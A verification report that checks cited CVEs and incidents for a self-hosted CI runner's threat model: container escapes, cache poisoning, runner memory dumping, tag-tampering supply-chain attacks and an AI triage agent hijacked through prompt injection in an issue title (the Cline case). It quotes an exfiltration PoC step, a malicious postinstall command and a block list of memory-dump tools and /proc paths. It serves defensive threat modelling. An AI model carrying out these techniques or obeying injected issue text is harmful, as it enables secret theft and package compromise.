# VERIFICATION REPORT — Round 2
## Cross-check of Round 1's Top-10 CI Runner Trust Failure Modes (OpenForge self-hosted CI runner)

Verification date: 2026-11-04
Method: Every CVE was confirmed against the NVD JSON API (services.nvd.nist.gov) and/or the GitHub Advisory Database API (api.github.com/advisories). Every blog/advisory/paper was fetched or resolved to a live, resolvable URL. Where a claim's exact URL was wrong or 404'd, the correct canonical URL is given.

Verdict legend:
- VERIFIED — exact CVE/advisory/blog confirmed live with the stated identity.
- VERIFIED-WITH-CORRECTION — the underlying fact is real, but a specific detail (date, version, mechanism, or URL path) in Round 1 was wrong; corrected value given.
- REFUTED / DIFFERENT-NUMBER — the cited identifier does not exist, or points to an entirely unrelated vulnerability.

Scope note: "OpenForge" is a greenfield self-hosted Git platform (TypeScript) building a CI runner. A self-hosted runner inherits the full threat model below: it executes untrusted code, holds secrets, mounts a container daemon, shares filesystem state, and needs egress to registries/toolchains.

=====================================================================
SCORECARD
=====================================================================

1a   CVE-2019-5736 (runc /proc/self/exe)                    VERIFIED (minor Docker version nuance)
1b   CVE-2024-21626 (Leaky Vessels, cwd/fd)                  VERIFIED
1c   CVE-2024-21627 (claimed "Leaky Vessels fd leak")        REFUTED / DIFFERENT NUMBER (it is PrestaShop XSS)
1d   CVE-2022-0492 (cgroups v1 release_agent)                VERIFIED
2a   Adnan Khan "Monsters in your build cache" (May 2024)    VERIFIED
2b   TanStack incident (May 2026, SafeDep)                   VERIFIED
2c   Cline incident (Feb 2026)                               VERIFIED
2d   Socket.dev cache-mode writeup                           VERIFIED
3a   MSRC Azure CLI credential leak (Nov 2023)               VERIFIED (+ CVE-2023-36052)
3b   Karim Rahal "GitHub Actions Leaking Secrets"            VERIFIED
3c   tj-actions/changed-files CVE-2025-30066                 VERIFIED-WITH-CORRECTION (wrong date 2024->2025; wrong mechanism "PR-based")
4a   tj-actions CISA alert URL                               VERIFIED (exact slug corrected)
4b   Trivy compromise (March 2026, Docker blog)              VERIFIED (+ CVE-2026-33634)
4c   KICS compromise (April 2026)                            VERIFIED
5a   GHSL "Preventing pwn requests" (2021)                   VERIFIED
5b   GHSL-2024-030 (docfx)                                   VERIFIED
5c   Wiz "pwn request reckoning" (2026)                      VERIFIED
5d   OWASP GitHub Actions Security Cheat Sheet               VERIFIED
6a   GitLab Runner security docs                             VERIFIED (URL path corrected)
6b   Safeguard "hidden state long-lived CI agent"            VERIFIED
6c   runs-on.com ephemeral vs long-lived                     VERIFIED
7a   Docker socket mount escape (maxuru.com)                 VERIFIED
7b   CVE-2022-0492 (shared with 1d)                          VERIFIED
8a   CVE-2026-32946 (Harden-Runner DNS over TCP)             CVE VERIFIED / "SentinelOne" attribution REFUTED
8b   CVE-2026-32947 (Harden-Runner DoH)                      CVE VERIFIED / "SentinelOne" attribution REFUTED
8c   UNSW TNSM 2019 DNS tunneling                            VERIFIED
8d   MDPI Sensors cloud DNS tunneling (claimed 2022)         VERIFIED-WITH-CORRECTION (published 2023)
9a   Sysdig TOCTOU tag mutability (2020)                     VERIFIED
9b   USENIX Security 2022 typosquatting                      VERIFIED
9c   CVE-2026-85747 (registry digest bypass)                 VERIFIED
10a  runs-on.com ephemeral vs long-lived (shared with 6c)    VERIFIED
10b  GitHub docs on compromised runners                      VERIFIED

Totals: 34 distinct verifiable claims
  - 31 VERIFIED (fully clean, or with detail corrections)
  - 3 REFUTED / DIFFERENT-NUMBER:
      * CVE-2024-21627 identity (it is PrestaShop XSS, not a container CVE)
      * the two "SentinelOne" attributions for CVE-2026-32946 / CVE-2026-32947 (real source is step-security / Devansh Batham)
  - 0 claims were outright fabricated as to the existence of the incident or CVE.
  - All errors are detail-precision errors (one CVE number, one vendor attribution, a few dates, two URL paths), which is exactly the class a threat model must not carry forward.

=====================================================================
SECTION 1 — SANDBOX ESCAPE FROM PRIVILEGED DOCKER CONTAINER
=====================================================================

--- 1a. CVE-2019-5736 — runc /proc/self/exe overwrite ---
VERDICT: VERIFIED (with a minor Docker-version correction)

Confirmed source: NVD JSON API
  https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-5736
Human-readable NVD page:
  https://nvd.nist.gov/vuln/detail/CVE-2019-5736

NVD description (verbatim, key parts):
  "runc through 1.0-rc6, as used in Docker before 18.09.2 and other products,
   allows attackers to overwrite the host runc binary (and consequently obtain
   host root access) ... This occurs because of file-descriptor mishandling,
   related to /proc/self/exe."

CVSS v3.1: 8.6 HIGH (AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)
Affected (per NVD CPEs):
  - Docker < 18.09.2
  - runc 1.0.0-rc1 through 1.0.0-rc6 (and 0.1.1)
  - LXC < 3.2.0, various RHEL/OpenShift, GKE, Apache Mesos
Key references (all live):
  - Dragonsector exploit:  https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html
  - Brauner "Privileged containers": https://brauner.github.io/2019/02/12/privileged-containers.html
  - Kubernetes blog:       https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/
  - runc fix commit:       https://github.com/opencontainers/runc/commit/0a8e4117e7f715d5fbeef398405813ce8e88558b
  - Exploit DB 46359 / 46369
  - PoC repos: Frichetten/CVE-2019-5736-PoC, q3k/cve-2019-5736-poc, rancher/runc-cve

Correction to Round 1:
  Claim wrote "Docker < 18.06.1, runc < 1.0-rc8." The runc-side fix is indeed
  1.0-rc8 (affected = rc6 and earlier) — that part is correct. But the NVD-
  registered Docker boundary is Docker Engine < 18.09.2 (CPE versionEndExcluding
  18.09.2; Docker 1.13.1 is the parallel affected line). "18.06.1" is not the
  documented boundary. Use "Docker < 18.09.2 / runc < 1.0-rc8" in the model.
  The core /proc/self/exe overwrite -> host root mechanism is 100% confirmed.

--- 1b. CVE-2024-21626 — "Leaky Vessels," runc process.cwd + leaked fds ---
VERDICT: VERIFIED

Confirmed source: NVD JSON API
  https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-21626
  (source identifier: security-advisories@github.com)

NVD description (verbatim, key parts):
  "In runc 1.1.11 and earlier, due to an internal file descriptor leak, an
   attacker could cause a newly-spawned container process (from runc exec) to
   have a working directory in the host filesystem namespace, allowing for a
   container escape by giving access to the host filesystem ('attack 2') ...
   variants ... could be also be used to overwrite semi-arbitrary host binaries
   ... ('attack 3a' and 'attack 3b'). runc 1.1.12 includes patches."

CVSS v3.1: 8.6 HIGH (identical vector to 5736). CISA SSVC: exploitation=poc, technicalImpact=total.
Vendor advisory (live):
  https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv
  ("several container breakouts due to internally leaked fds"). Details the
  /sys/fs/cgroup fd leak (added in v1.0.0-rc93), process.cwd set to
  /proc/self/fd/7/, and the four-part fix in 1.1.12.
Fix: runc 1.1.12.

Snyk Labs URL — VERIFIED, but the path Round 1 implied is wrong:
  - https://snyk.io/blog/containerd-runc-leaky-vessels/  -> 404s.
  - Correct live URLs (fetched & confirmed):
      https://labs.snyk.io/resources/cve-2024-21626-runc-process-cwd-container-breakout/
        (Rory McNamara, Snyk Labs, 2024-01-31) — primary technical writeup.
      https://labs.snyk.io/resources/leaky-vessels-container-vuln-deep-dive/
        (2024-02-06) — the "Leaky Vessels" deep dive.
  - Snyk containerd advisory confirming the containerd framing:
      https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMCONTAINERDCONTAINERD-6219724
      ("Upgrade github.com/containerd/containerd to 1.6.28, 1.7.13 or higher.")
      -> confirms Round 1's "containerd < 1.7.13" framing is correct.

Note for the model: this is fundamentally a runc bug (not a containerd bug);
containerd is affected only transitively by bundling runc. The "Leaky Vessels"
name is Snyk's; an independent disclosure was by Vicarius:
  https://www.vicarius.io/vsociety/posts/leaky-vessels-part-1-cve-2024-21626

--- 1c. CVE-2024-21627 — claimed "Leaky Vessels, file descriptor leak" ---
VERDICT: REFUTED / DIFFERENT NUMBER

Confirmed source: NVD JSON API
  https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-21627
What CVE-2024-21627 actually is:
  "PrestaShop is an open-source e-commerce platform. Prior to versions 8.1.3 and
   1.7.8.11, some event attributes are not detected by the isCleanHTML method.
   Some modules using the isCleanHTML method could be vulnerable to cross-site
   scripting." (CWE-79; fixed in PrestaShop 8.1.3 / 1.7.8.11.)
  Vendor advisory: https://github.com/PrestaShop/PrestaShop/security/advisories/GHSA-xgpm-q3mq-46rq
  It has nothing to do with containers, runc, or file descriptors.

Correction: The "file descriptor leak" described in Round 1 is NOT a separate
CVE — it is part of CVE-2024-21626's own description ("due to an internal file
descriptor leak ..."). There is no container "CVE-2024-21627." Remove
CVE-2024-21627 from the threat model and fold the fd-leak detail into
CVE-2024-21626.

--- 1d. CVE-2022-0492 — cgroups v1 release_agent escape ---
VERDICT: VERIFIED

Confirmed source: NVD JSON API (source: secalert@redhat.com)
  https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2022-0492
NVD description (verbatim):
  "A vulnerability was found in the Linux kernel's cgroup_release_agent_write in
   the kernel/cgroup/cgroup-v1.c function. This flaw ... allows the use of the
   cgroups v1 release_agent feature to escalate privileges and bypass the
   namespace isolation unexpectedly."
CVSS v3.1: 7.8 HIGH. CWE-862 (NVD) / CWE-287 (Red Hat).
Affected kernels: 2.6.24 -> 5.17-rc2 (multiple backport ranges).
Fixed via kernel commit 24f6008564183aa120d07c03d9289519c2fe02af:
  https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=24f6008564183aa120d07c03d9289519c2fe02af
Exploit reference (live):
  http://packetstormsecurity.com/files/176099/Docker-cgroups-Container-Escape.html
Notable 2026 development:
  CISA added CVE-2022-0492 to the Known Exploited Vulnerabilities (KEV) catalog
  on 2026-06-02 (action due 2026-06-05):
  https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2022-0492
  -> This makes it actively-exploited status as of mid-2026, which elevates its
     priority for OpenForge (any runner host on cgroups v1 with privileged
     containers is in scope).

=====================================================================
SECTION 2 — CACHE POISONING
=====================================================================

--- 2a. Adnan Khan — "The Monsters in Your Build Cache" (May 2024) ---
VERDICT: VERIFIED

Exact URL (fetched & confirmed):
  https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/
Author/date: Adnan Khan, May 6, 2024 (claim's "May 2024" is correct). 25-min read.

Specific technique described (confirmed in body): Adnan coins "Actions Cache Blasting."
  1. Precondition: code execution in a main-branch workflow (pwn request, or
     compromised dependency / malicious insider).
  2. Steal the cache token: dump the runner's memory to extract CacheServerUrl
     + AccessToken.
  3. Overwrite anything: cache restore is just tar extraction, which overwrites
     files — a poisoned entry can overwrite package.json, Makefile, goreleaser
     config in the restoring (privileged) workflow.
  4. Blasting the cache: exploit the 10 GB per-repo cache limit + LRU eviction
     to force eviction of a "reserved" entry, then repopulate it poisoned — all
     inside the 6-hour runtime-token validity window (token not invalidated
     after job conclusion).
  Real PoC: he poisoned the Angular repo cache and showed he could reach
  angular.dev deployment keys. Also demonstrates tampering a SLSA Level 3 build's
  signed-provenance cache with no trace.
  Update in the post (2025-01-23): GitHub later blocked saving cache entries
  after a job finishes; the technique now must run entirely in-build (Cacheract).

Companion (verified, adds a 2024-12 PoC tool):
  https://adnanthekhan.com/2024/12/21/cacheract-the-monster-in-your-build-cache/
  Cacheract: https://github.com/adnaneKhan/cacheract (MIT). This post explicitly
  notes "Threat actors are even picking up on the technique, as we saw with the
  Ultralytics supply chain attack" — a real-world cache-poisoning incident
  Round 1 did not list (see ADDITIONS #5).

--- 2b. TanStack incident (May 2026) — SafeDep blog ---
VERDICT: VERIFIED

SafeDep URL (fetched & confirmed):
  https://safedep.io/blog/tanstack-github-actions-cache-poisoning
  ("Cache Poisoning Through pull_request_target: The TanStack Incident.")
Primary source (fetched & confirmed):
  https://tanstack.com/blog/npm-supply-chain-compromise-postmortem
  (Tanner Linsley, 2026-05-11; all-clear 2026-05-15)
Corroborating (fetched):
  https://www.socket.dev/blog/tanstack-npm-packages-compromised-mini-shai-hulud-supply-chain-attack
  https://appwrite.io/blog/post/tanstack-start-npm-supply-chain-attack
  https://ghtier.com/incidents/cache-poisoning

Confirmed facts (from the fetched postmortem + SafeDep):
  - Date: 2026-05-11, 19:20-19:26 UTC.
  - Actor: GitHub user zblgg, PR #7378 against TanStack/router (fork renamed to
    zblgg/configuration to evade fork-list search).
  - Kill chain (confirmed verbatim):
      pull_request_target pwn request
    -> bundle-size.yml checks out refs/pull/7378/merge, runs attacker vite_setup.mjs
    -> malicious code writes a poisoned pnpm store to the cache under the exact
       key Linux-pnpm-store-${hashFiles('**/pnpm-lock.yaml')}
    -> release.yml (push-to-main, id-token: write for npm trusted publishing)
       restores that poisoned store
    -> malware extracts the OIDC token from the GitHub Actions runner process
       memory ("the same script as the tj-actions compromise")
    -> publishes 84 malicious versions across 42 @tanstack/* npm packages.
  - Key nuance (verified): cache writes use a runner-internal token, NOT
    GITHUB_TOKEN, so permissions: contents: read did NOT stop the cache write.
    No npm token was stolen; the npm publish workflow itself was not modified —
    publishing was authenticated via the OIDC trusted-publisher binding.
  - Remediation timeline (verified):
      22:02 UTC flip bundle-size.yml from pull_request_target -> pull_request
      22:57 UTC bust cache key (-v2 suffix)
      08:12 UTC next day disable caching in the shared setup action

--- 2c. Cline incident (Feb 2026) ---
VERDICT: VERIFIED

Blog URLs (fetched & confirmed):
  Snyk:                 https://snyk.io/blog/cline-supply-chain-attack-prompt-injection-github-actions/
                        ("How 'Clinejection' Turned an AI Bot into a Supply Chain Attack")
  Cline post-mortem:    https://cline.bot/blog/post-mortem-unauthorized-cline-cli-npm
                        (Saoud Rizwan, 2026-02-17/24)
  Cole Murray:          https://murraycole.com/posts/cline-compromise-prompt-injection-supply-chain-attack
  GHSA:                 https://github.com/cline/cline/security/advisories/GHSA-9ppg-jx86-fqw7
  (Adnan Khan's write-up referenced as https://adnanthekhan.com/posts/clinejection/ in OWASP.)

Confirmed facts:
  - Vulnerability introduced: 2025-12-21 (a GitHub Actions "issue triage"
    workflow using claude-code-action with allowed_non_write_users: "*" and Bash
    tool access, on the default branch -> shared cache scope with the nightly
    release workflow).
  - Reported privately: 2026-01-01 (Adnan Khan via GH private reporting) — not
    addressed until public disclosure 2026-02-09; fixed within ~30 minutes of
    disclosure (vulnerable workflows removed, PR #9211).
  - Exploited 2026-02-17: an actor used a still-active npm token (Cline had
    rotated the WRONG token on Feb 9) to publish cline@2.3.0 with
    postinstall: "npm install -g openclaw@latest". Live ~8 hours; fixed 2.4.0;
    2.3.0 deprecated. Payload was benign (openclaw is a legit project).
  - Attack class (verified): prompt-injection in an issue title -> AI agent runs
    npm install github:cline/cline#<dangling-commit> -> preinstall hook ->
    Cacheract cache poisoning (flood cache >10 GB to force LRU eviction, plant
    poisoned entries matching nightly keys) -> nightly publish restores ->
    exfil VSCE_PAT / OVSX_PAT / NPM_RELEASE_TOKEN.
  - Post-incident: Cline moved npm publishing to OIDC provenance via GitHub
    Actions (eliminating long-lived static tokens).

--- 2d. Socket.dev — cache-mode writeup ---
VERDICT: VERIFIED

Exact URL (fetched & confirmed):
  https://socket.dev/blog/github-actions-cache-mode
  ("GitHub Actions Adds cache-mode to Limit Cache Poisoning Risk", Sarah Gooding, Sep 16, 2026)

What it is: a mitigation writeup (not the original technique post). Confirmed content:
  - cache-mode values read / write / write-only / none.
  - read is default for low-trust events (pull_request_target); write for trusted (push).
  - cache-service-enforced; carries through reusable workflows.
  - GitHub recommends none for AI-agent workflows (explicitly citing Cline).
  - Explicitly ties the control to Ultralytics PyPI (2024), TanStack npm (May 2026),
    and Cline; notes SLSA provenance / Sigstore still pass on a build that restored
    a tampered cache.
Supporting (fetched):
  GitHub changelog:  https://github.blog/changelog/2026/09/10-control-github-actions-cache-access-with-cache-mode/
  Safeguard:         https://safeguard.sh/resources/blog/github-actions-cache-mode-cache-poisoning-controls
Note: Round 1 filed this under "Cache poisoning" (the technique). It is a control/
mitigation post. Keep it, but relabel as the defensive countermeasure (directly
actionable for OpenForge — adopt cache-mode semantics natively).

=====================================================================
SECTION 3 — SECRET LEAKAGE VIA BUILD LOGS
=====================================================================

--- 3a. MSRC — Azure CLI credential leak via GitHub Actions logs (Nov 2023) ---
VERDICT: VERIFIED (associated CVE is a bonus find)

Exact URL (fetched & confirmed):
  https://www.microsoft.com/en-us/msrc/blog/2023/11/microsoft-guidance-regarding-credentials-leaked-to-github-actions-logs-through-azure-cli
  (MSRC, November 14, 2023 — claim's "Nov 2023" is correct)
Associated CVE (verified):
  CVE-2023-36052 — "Azure CLI REST Command Information Disclosure Vulnerability",
  Max Severity Critical, released 2023-11-14, CWE-359.
  Update guide: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36052/
  Fix: Azure CLI >= 2.53.1 (recommends 2.54).

Confirmed facts (from the fetched MSRC blog):
  - Discovered by Palo Alto Networks Prisma Cloud (Aviad Hahami); companion post:
    https://www.paloaltonetworks.com/blog/cloud-security/secrets-leakage-user-error-azure-cli/
  - Certain az commands (esp. App Service family update commands) echo secrets
    (plaintext passwords/usernames) into CI/CD logs as intended behavior; in
    public repos that is world-readable; in private repos readable by anyone with
    repo access.
  - Microsoft's response: new default in Azure CLI 2.53.1+ suppressing secrets in
    App Service update output; expanded secret redaction in both Azure Pipelines
    and GitHub Actions logs for recognizable Microsoft key patterns (noted as "not
    currently comprehensive").
  - BleepingComputer corroboration:
    https://www.bleepingcomputer.com/news/microsoft/microsoft-fixes-critical-azure-cli-flaw-that-leaked-credentials-in-logs/
Why it matters for OpenForge: canonical "the tool prints secrets to the log, and
the log is the exfil channel" case. Treat build logs as an exfiltration channel —
any secret reaching a log is gone. Reinforced by GitHub's own "Compromised runners"
doc (see 10b: "GitHub Actions automatically redact secrets printed to the log,
but this is not a true security boundary").

--- 3b. Karim Rahal — "GitHub Actions Leaking Secrets" ---
VERDICT: VERIFIED

Exact URL (confirmed via multiple references + mirror):
  https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/
  ("Leaking Secrets From GitHub Actions: Reading Files And Environment Variables,
   Intercepting Network/Process Communication, Dumping Memory.")
  Date: January 5, 2023. (Confirmed by the reference list inside Adnan Khan's
  Dec 2023 post and the WebHackList mirror
  https://webhacklist.com/reference/karimrahal-com-leaking-secrets-github-actions-reading-files-environment-memory/.)

Confirmed techniques (this post is the canonical reference for runner memory exfiltration):
  - Read the expanded .sh files the runner writes under _temp (contains interpolated secrets).
  - Dump the environment of Node.js action processes.
  - Most reliably: sudo + gcore to dump Runner.Listener memory, which yields every
    workflow secret plus the read-write GITHUB_TOKEN even when none are referenced.
Why this is the linchpin of the whole model (verified lineage):
  This exact gcore / /proc/PID/mem memory-dump primitive is the shared payload
  across the tj-actions (2025), Cline (2026), TanStack (2026), and Trivy (2026)
  incidents. The Trivy GHSA literally says the infostealer "Dumps Runner.Worker
  process memory via /proc/PID/mem to extract secrets." Make runner process
  memory the #1 "secret vault" invariant; hard-block gcore, /proc/*/mem,
  /proc/*/environ, /proc/*/fd in every job sandbox.

--- 3c. tj-actions/changed-files (CVE-2025-30066) ---
VERDICT: VERIFIED-WITH-CORRECTION
(See full detail under 4a — it is both a secret-leak and a supply-chain event.
The CVE and the ~23K-repo impact are real; the "March 2024" date and "PR-based
attack" framing are wrong: it was March 14-15, 2025, via compromised-PAT tag
tampering, enabled by the reviewdog/action-setup compromise CVE-2025-30154.)

=====================================================================
SECTION 4 — SUPPLY CHAIN VIA ACTION MARKETPLACE
=====================================================================

--- 4a. tj-actions/changed-files — CVE-2025-30066 (~23K repos) ---
VERDICT: VERIFIED-WITH-CORRECTION

GH Advisory (fetched & confirmed, authoritative):
  https://api.github.com/advisories?cve_id=CVE-2025-30066  -> GHSA-mrrh-fwg8-r2c3
  Human URL: https://github.com/advisories/GHSA-mrrh-fwg8-r2c3
NVD:
  https://nvd.nist.gov/vuln/detail/CVE-2025-30066
  "tj-actions changed-files before 46 allows remote attackers to discover secrets
   by reading actions logs. (The tags v1 through v45.0.7 were affected on
   2025-03-14 and 2025-03-15 because they were modified by a threat actor to
   point at commit 0e58ed8, which contained malicious updateFeatures code.)"
  CVSS 8.6 HIGH, CWE-506 (Embedded Malicious Code).
CISA alert (fetched & confirmed — correct URL):
  https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction
  (The slug Round 1 / the GHSA reference pointed at, ...cve-2025-30066, 404s —
   the live slug ends in -and-reviewdogaction.)
  KEV addition alert:
  https://www.cisa.gov/news-events/alerts/2025/03/18/cisa-adds-two-known-exploited-vulnerabilities-catalog
  Added to CISA KEV 2025-03-18 (due 2025-04-08).

Corrected facts vs. Round 1's claim:
  - Date: Round 1 said "March 2024." Wrong — it was March 2025. Malicious window
    2025-03-14 -> 2025-03-15 (reviewdog/action-setup compromised ~2025-03-11
    18:42-20:31 UTC).
  - Mechanism: Round 1 said "PR-based attack." Wrong/incomplete. It was NOT a
    pwn-request/PR attack. It was tag tampering via a compromised GitHub PAT:
    the attacker (linked to contributor nikitastupin) with repo write access
    retroactively repointed version tags (v1.0.0, v35.7.7-sec, v44.5.1) to a
    malicious commit 0e58ed8671d6b60d0890c21b07f8835ace038e67. That commit ran a
    Python script (memdump.py fetched from a gist) that dumped the Runner Worker
    process memory (the Karim Rahal primitive) and base64-encoded the secrets
    into the build logs (double base64). Public-repo logs = public exfil.
  - Enabler (Round 1 MISSED): CVE-2025-30154 — reviewdog/action-setup@v1 was
    compromised in the same window; tj-actions/eslint-changed-files uses
    reviewdog/action-setup@v1 and ran it with a PAT, so the reviewdog action was
    the entry point (per Wiz researcher Rami McCarthy). CISA explicitly lists the
    affected reviewdog actions (action-shellcheck, action-composite-template,
    action-staticcheck, action-ast-grep, action-typos).
  - Impact: "~23,000 repositories" — correct. Secrets exposed: AWS keys, GitHub
    PATs, npm tokens, private RSA keys. Patched in v46.0.1
    (https://github.com/tj-actions/changed-files/releases/tag/v46.0.1).

Corrected one-liner for the model:
  "CVE-2025-30066 (tj-actions/changed-files), Mar 14-15 2025, ~23K repos.
   Compromised-PAT tag tampering (tags repointed to malicious commit 0e58ed8) —
   enabled by CVE-2025-30154 (reviewdog/action-setup). Payload: /proc/PID/mem
   dump of Runner Worker -> secrets base64'd into public logs. CISA KEV 2025-03-18."

--- 4b. Trivy compromise (March 2026) — Docker blog ---
VERDICT: VERIFIED

Docker blog (fetched & confirmed):
  https://www.docker.com/blog/trivy-supply-chain-compromise-what-docker-hub-users-should-know/
  (Mark Lechner, Mar 23, 2026 — claim's "March 2026" is correct)
Additional confirmed sources:
  GHSA:      https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23
  CVE:       CVE-2026-33634  (https://scout.docker.com/vulnerabilities/id/CVE-2026-33634)
  Socket:    https://socket.dev/blog/trivy-docker-images-compromised
  StepSecurity: https://www.stepsecurity.io/blog/trivy-compromised-a-second-time---malicious-v0-69-4-release

Confirmed facts:
  - Actor: TeamPCP (infostealer). Root cause: Aqua Security's CI/CD pipeline
    compromised via non-atomic credential rotation (a window where a still-valid
    token let the attacker exfil newly-rotated secrets), continuing from a late-
    Feb 2026 intrusion first disclosed Mar 1.
  - What was compromised: malicious Trivy v0.69.4 release (Mar 19); force-push of
    76 of 77 version tags in aquasecurity/trivy-action to infostealer; all 7 tags
    in aquasecurity/setup-trivy replaced; then malicious Docker Hub images
    v0.69.5, v0.69.6, and latest (Mar 22) pushed with separately-compromised
    Docker Hub credentials.
  - Payload (confirmed): infostealer in entrypoint.sh runs before the real scan;
    dumps Runner.Worker memory via /proc/PID/mem to extract secrets; sweeps 50+
    paths (SSH keys, AWS/GCP/Azure creds, k8s tokens, .env, crypto wallets);
    AES-256-CBC + RSA-4096 hybrid encryption; exfil to C2 domain
    scan.aquasecurtiy.org (typosquatted); fallback = create a public tpcp-docs
    GitHub repo and upload stolen data as a release asset.
  - Docker-specific guidance (fetched): pin by digest not tag; verify signed
    provenance attestations (digest alone insufficient); rotate credentials
    atomically; if a Trivy container ran with the Docker socket mounted, treat
    the whole host as compromised. Last known clean: 0.69.3.
Why it matters: textbook "image substitution via stolen publisher credentials +
mutable latest tag" event — directly validates 7/9 (host fs escape + registry
substitution) and is the single best 2026 case study for OpenForge's image-pull
trust boundary.

--- 4c. KICS compromise (April 2026) ---
VERDICT: VERIFIED

Confirmed sources (fetched):
  Checkmarx (primary, live):  https://checkmarx.com/blog/ongoing-security-updates/ (updates through June 2026)
  Docker:                     https://www.docker.com/blog/trivy-kics-and-the-shape-of-supply-chain-attacks-so-far-in-2026/ (Apr 23, 2026)
  Socket:                     https://socket.dev/blog/checkmarx-supply-chain-compromise
  BleepingComputer:           https://www.bleepingcomputer.com/news/security/new-checkmarx-supply-chain-breach-affects-kics-analysis-tool/
  Wiz incident tracker:       https://threats.wiz.io/all-incidents/checkmarx-kics-and-bitwarden-cli-compromised-in-fresh-supply-chain-attack

Confirmed facts:
  - Date: 2026-04-22 ~12:35 UTC (claim's "April 2026" is correct). Follow-on /
    second wave of the same 2026 campaign — the attacker authenticated to Docker
    Hub with valid Checkmarx publisher credentials that were compromised because
    of the Mar 23 Trivy attack (Checkmarx GitHub access gained 2026-03-19/23 via
    the Trivy vector).
  - What was compromised (KICS): malicious checkmarx/kics Docker images — 5
    existing tags overwritten to malicious digests (latest, v2.1.20,
    v2.1.20-debian, alpine, debian) + 2 new tags (v2.1.21, v2.1.21-debian); built
    from an attacker-controlled source repo, not Checkmarx's.
  - Payload: trojanized KICS binary kept the legit scan surface intact but added
    a quiet exfil path — scan output (which contains secrets, cloud creds,
    internal topology, because KICS scans Terraform/CloudFormation/K8s) is
    encrypted and sent to audit.checkmarx[.]cx with User-Agent KICS-Telemetry/2.0.
  - Broader (same wave): malicious Checkmarx VS Code / DevAssist extensions (a
    hidden "MCP addon" mcpAddon.js fetched from a hardcoded commit in Checkmarx's
    own repo, executed via Bun; steals dev + cloud creds, injects a GitHub
    Actions workflow that captures secrets, abuses npm tokens for republish);
    malicious checkmarx/ast-github-action tag 2.3.35; dark-web leak of exfiltrated
    data (Mar 30 exfil, Apr 25 leak); and on Apr 23 a malicious @bitwarden/cli npm
    publish. TeamPCP publicly claimed responsibility.

=====================================================================
SECTION 5 — FORK PR TRUST BOUNDARY / PWN REQUEST
=====================================================================

--- 5a. GitHub Security Lab — "Preventing pwn requests" (2021) ---
VERDICT: VERIFIED

Exact URL (fetched & confirmed):
  https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/
  ("Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn
   requests", Jaroslav Lobačevski, August 3, 2021)
Content confirmed: canonical explanation of the pull_request_target danger (write
token + base-repo secrets + base-repo context), the pull_request vs
pull_request_target vs workflow_run privilege model, and the secure "untrusted
code runs on pull_request (read-only) -> store artifacts -> privileged workflow_run
consumes artifacts" pattern.
Note: Part 1 of a series (Parts 2-4 cover untrusted input, etc.). This is the
origin document for the "pwn request" term and is still cited by GitHub's current
docs (verified in the "Securely using pull_request_target" reference page).

--- 5b. GHSL-2024-030 (docfx) ---
VERDICT: VERIFIED

Exact URL (fetched & confirmed):
  https://securitylab.github.com/advisories/GHSL-2024-030_dotnet_docfx/
  ("GHSL-2024-030: Potential secrets exfiltration from a Pull Request in docfx",
   Alvaro Munoz / @pwntester, July 17, 2024)
Confirmed facts:
  - Project: dotnet/docfx (tested 2.75.3). ci.yml used pull_request_target with
    branches: [main, feature/*, hotfix/*] and an explicit actions/checkout of the
    PR head (ref: ${{github.event.pull_request.head.ref}}, repository: ...head.repo.
    full_name) -> runs attacker code with secrets (e.g., PERCY_TOKEN).
  - PoC: malicious templates/package.json lint script -> nslookup
    YOUR-CONTROLLED-SERVER -> exfil.
  - Found via the CodeQL query "Checkout of untrusted code in trusted context."
  - Disclosure nuance (confirmed): MSRC initially deemed the specific token
    non-confidential and closed as informative (2024-03-18); GHSL published the
    advisory 2024-07-17 for educational purposes. It is a real, published GHSL
    advisory — the "did it get a CVE?" ambiguity does not affect its legitimacy.

--- 5c. Wiz — "GitHub Actions security: pwn request reckoning" (2026) ---
VERDICT: VERIFIED

Exact URL (fetched & confirmed):
  https://www.wiz.io/blog/github-actions-security-pwn-request-reckoning
  ("The Pwn Request Reckoning: What Still Works Against GitHub Actions",
   Shay Berkovich, October 26, 2026 — claim's "2026" is correct)
Confirmed content (current as of 2026-10) — maps GitHub's 2026 Actions hardening
timeline and the residual attack surface:
  - 2026-06-18: actions/checkout@v7.0.0 blocks fork code checkouts by default on untrusted triggers.
  - 2026-06-26: platform read-only cache tokens for untrusted triggers.
  - 2026-07-20: fork-checkout protection backported to actions/checkout
    v2.8.0 / v3.7.0 / v4.4.0 / v5.1.0 / v6.1.0 (v1 excluded).
  - 2026-09-10: fine-grained cache-mode GA.
  - 2026-09-17: Workflow Execution Protections (event policies + actor rules) GA.
  - 2026-12-02 (scheduled): default event policy blocks pull_request_target in
    public repos with no explicit policy (private/internal repos and workflow_run
    not affected).
Residual risks (verified): the SHA-pinning paradox (a pre-2026-07-20 SHA pin opts
out of the platform guard); git clone / gh pr checkout / third-party checkout
actions bypass action-level controls; issue_comment and repository_dispatch
privileged triggers are NOT covered; script injection via interpolation is
untouched by all 2026 changes; persistent state on non-ephemeral self-hosted runners.
Corroborating (fetched):
  https://www.intelfusions.com/news/github-actions-pwn-request-residual-gaps-wiz
Why it's the single most important 2026 reference for OpenForge: it tells you
exactly which GitHub-side controls now exist (so OpenForge must match or beat them,
not assume GitHub's defaults) and which holes remain.

--- 5d. OWASP GitHub Actions Security Cheat Sheet ---
VERDICT: VERIFIED

Exact URL (fetched & confirmed):
